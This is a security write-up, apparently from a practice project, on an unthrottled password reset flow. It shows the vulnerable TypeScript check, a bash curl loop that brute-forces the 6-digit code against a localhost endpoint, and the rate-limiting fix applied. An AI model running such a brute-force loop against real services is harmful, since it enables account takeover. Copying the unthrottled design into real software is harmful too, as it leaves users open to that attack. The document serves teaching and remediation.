# A06 — Insecure Design

**Where:** `backend/src/services/PasswordResetService.ts`
**Flow:** Password recovery (`POST /auth/recover-password`, `POST /auth/recover-password/confirm`)

**Status:** ✅ Fixed — [`556bcaa`](https://github.com/eugabriel-lacerda/fixed_vulnerable_notes/commit/556bcaa)

---

## Context

The password recovery flow generates a 6-digit numeric code and lets the client submit guesses against `confirm` with no limit on attempts, no cooldown, and no lockout — not a coding bug, a missing design decision. Nothing in the code path was ever meant to throttle this endpoint; the abuse resistance was simply never designed in.

```ts
// backend/src/services/PasswordResetService.ts
export async function confirmPasswordReset(email: string, code: string, newPassword: string) {
  const user = await findUserByEmail(email);
  // ...
  const resetCode = await PasswordResetRepository.findLatestByUserId(user.id);

  if (!resetCode || resetCode.code !== code) {
    throw new AppError("Invalid reset code", 400);
  }
  // ...
}
```

A 6-digit code has 1,000,000 possible values. That sounds like a lot, but with zero rate limiting, an attacker can fire thousands of guesses per minute against a single account.

## PoC

```bash
for i in $(seq -w 0 999999); do
  RESULT=$(curl -s -X POST http://localhost:3002/auth/recover-password/confirm \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@test.com\",\"code\":\"$i\",\"newPassword\":\"hacked123\"}")

  if [[ "$RESULT" == *"Password updated"* ]]; then
    echo "Found code: $i"
    break
  fi
done
```

## Impact

Full account takeover for any user whose email is known, without needing to phish or steal credentials — just requesting a reset and brute-forcing the confirmation code. Combined with [A09](A09-logging-failures.md)'s missing logging elsewhere in this app, an attack like this leaves no trace to detect it in progress.

## Planned fix

Add a rate limiter scoped to `recover-password/confirm` (e.g. `express-rate-limit`, keyed by email or IP), and lock the reset flow after N consecutive failed attempts within a time window, forcing a fresh code request.

## Fix applied

A per-IP rate limiter was added to `recover-password/confirm` and the other auth routes ([`556bcaa`](https://github.com/eugabriel-lacerda/fixed_vulnerable_notes/commit/556bcaa), 5 requests/15min), which neutralizes the PoC above — the 1,000,000-guess loop from one machine now hits the limit almost immediately.

The stricter "lock after N consecutive failures" design from the planned fix was evaluated and deliberately not implemented on top of the rate limiter — same reasoning as [A07 Part 2](A07-auth-failures.md#part-2--no-lockout-after-repeated-failed-login-attempts): it only matters against a distributed/IP-rotating attacker, which isn't what this project's PoC demonstrates, and the added state (in-memory or a new DB table) wasn't judged worth it for the threat model in scope here. This is also where [A07 Part 3](A07-auth-failures.md#part-3--password-reset-code-never-expires)'s fix helps independently: the code TTL means even an attacker who *does* get past the rate limit has a shrinking window to guess in.

---

**Reference:** [OWASP Top 10:2025](https://owasp.org/Top10/)
